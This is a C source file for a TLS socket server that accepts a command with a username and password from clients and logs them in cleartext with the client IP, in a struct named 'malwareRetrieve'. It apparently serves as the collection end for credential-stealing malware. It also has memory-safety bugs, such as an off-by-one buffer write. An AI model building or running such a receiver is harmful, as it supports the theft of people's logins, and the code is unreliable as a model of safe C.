#include <openssl/crypto.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <arpa/inet.h>
#include "server.h"
#include <stdarg.h>

#include <openssl/ssl.h>
#include <openssl/err.h>
// dont forget about too many conn and dos!!


struct sockaddr_in addr;
struct sockaddr_in client_addr;
  
void printLog(char *msg, ...){
  printf("\33[2K\r");
  va_list args;
  va_start(args, msg);
  vprintf(msg, args);
  va_end(args);
  printf("Interact -> ");
  fflush(stdout);  
  // printf("%s", msg);
  
}

void *handleClient(void *arg){
  infoclient *client = (infoclient*)  arg;
  if (client == NULL) {
    printf("Client == NULL !!!\n");
    return NULL;
  }
  printLog("[LOG][id: %d - from: %s] Connexion established and is being handled !\n", client->client, client->ip);
  while (1) {
    char buffer[512];
    int len = SSL_read(client->ssl, buffer, sizeof(buffer));
    if (len <= 0) {
      printLog("Conn is closed!\n");
      break;
    }
    
    buffer[len] = '\0';
    printf("Raw message received -> %s", buffer);
    buffer[strcspn(buffer, "\r\n")] = '\0';
    printLog("[LOG][id: %d - from: %s] Message received is %s \n",client->client, client->ip, buffer);
    char *saveTOK;
    char *clientinput = strtok_r(buffer, " ", &saveTOK);
    if (strncmp(clientinput, API_COMMAND, strlen(API_COMMAND)) == 0 ) {
      malwareRetrieve current;
      clientinput = strtok_r(NULL, " ", &saveTOK);
      if (clientinput != NULL) {
        strncpy(current.username, clientinput, 64);
        current.username[63] = '\0';
        clientinput = strtok_r(NULL, " ", &saveTOK);
        if (clientinput != NULL) {
          if (strtok_r(NULL, " ", &saveTOK) != NULL) {
            // Too many arguments!
            printLog("[LOG][id: %d - from: %s] too many arguments!\n", client->client, client->ip);
            break;
          }
          strncpy(current.password, clientinput, 64);
          current.password[strlen(current.password)] = '\0';
          printLog("[LOG][id: %d - from: %s] Successfull connexion to the command\n --> Username: %s, Password: %s ! \n", client->client, client->ip, current.username, current.password);
          strncpy(current.ipaddr, client->ip, 16);
          current.ipaddr[strlen(current.ipaddr)] = '\0';
          close(client->client);
          free(client);
          return NULL;
        }
        else {
            printLog("[LOG][id: %d - from: %s] Wrong api calls!\n", client->client, client->ip);
            break;
        }
      }
      else {
          printLog("[LOG][id: %d - from: %s] Wrong api calls !\n", client->client, client->ip);
          break;
      }
    }
    else {
      printLog("[LOG][id: %d - from: %s] Received wrong arguments !\n", client->client, client->ip);
      break;
    }
         
  }

  printLog("[LOG][id: %d - from: %s] Transaction finished, closing connexion.\n", client->client, client->ip);
  SSL_shutdown(client->ssl);
  SSL_free(client->ssl);
  close(client->client);
  free(client);
  
  return NULL;
}

void *ListenToClient(void *arg){
  context *fullcontext = (context*) arg;
  printLog("[LOG] Socket binded and listening !\n[LOG] Waiting for new connexion...\n");
  while (1) {
    printf("Full context!\n");
    struct sockaddr_in client_addr;
    socklen_t client_len = sizeof(client_addr);
    int newsocket = accept(fullcontext->fd, (struct sockaddr *) &client_addr, &client_len);
    infoclient *client  = malloc(sizeof(infoclient));
    client->client = newsocket;
    client->ssl = SSL_new(fullcontext->ctx);
    SSL_set_fd(client->ssl, client->client);
    if (SSL_accept(client->ssl) <= 0) {
      printLog("[LOG] Failed to initialise new ssl socket for client!\n");
      close(client->client);
      SSL_free(client->ssl);
      free(client);
      exit(-1);
    }
    inet_ntop(AF_INET, &client_addr.sin_addr, client->ip , sizeof(client->ip));
    pthread_t newthread;
    pthread_create(&newthread, NULL, handleClient, client);
    pthread_detach(newthread);
  }
  
}




int main(){
  printLog("[STARTING] Starting the server program\n");
  // Initialise a socket

  SSL_load_error_strings();
  OpenSSL_add_ssl_algorithms();
  
  const SSL_METHOD *method = TLS_server_method();
  SSL_CTX *ctx = SSL_CTX_new(method);
  if (!ctx) {
    printLog("[LOG] Error setting context for ssl\n");
    exit(-1);
  }

  if (!SSL_CTX_use_certificate_file(ctx, "certificate.crt", SSL_FILETYPE_PEM)){
    printLog("[LOG] Error in setting certificate file\n");
    exit(-1);
  }
  if (!SSL_CTX_use_PrivateKey_file(ctx, "private.key", SSL_FILETYPE_PEM)){
    printLog("[LOG] Error in setting private key file\n");
    exit(-1);
  }


  int socketfd = socket(AF_INET, SOCK_STREAM, 0);
  if (socketfd == -1) {
    printLog("[LOG] Error code -1 - Failed to initialise a socket ");
  }
  addr.sin_family = AF_INET;
  addr.sin_port = htons(6000); 
  addr.sin_addr.s_addr = INADDR_ANY;  
  if (bind(socketfd, (const struct sockaddr *) &addr, sizeof(addr)) == -1){
    printLog("[LOG] Error code -1 -  in binding the port \n");
    exit(-1);
  }
  int opt = 1;
  setsockopt(socketfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

  
  if (listen(socketfd, 10) == -1) {
    printLog("[LOG] Error code -1 - Failed to set the socket to listen \n");
    exit(-1);
  }
  context *fullcontext = malloc(sizeof(context));
  if (!fullcontext) {
    printLog("[LOG] Error in malloc for fullcontext struct \n");
  }
  fullcontext->fd = socketfd;
  fullcontext->ctx = ctx;
  
  pthread_t mainLoop;
  pthread_create(&mainLoop, NULL, ListenToClient, fullcontext);
  printf("Interact -> ");
  while (1) {
    char buffer[64];
    fgets(buffer, sizeof(buffer), stdin);
  }

}
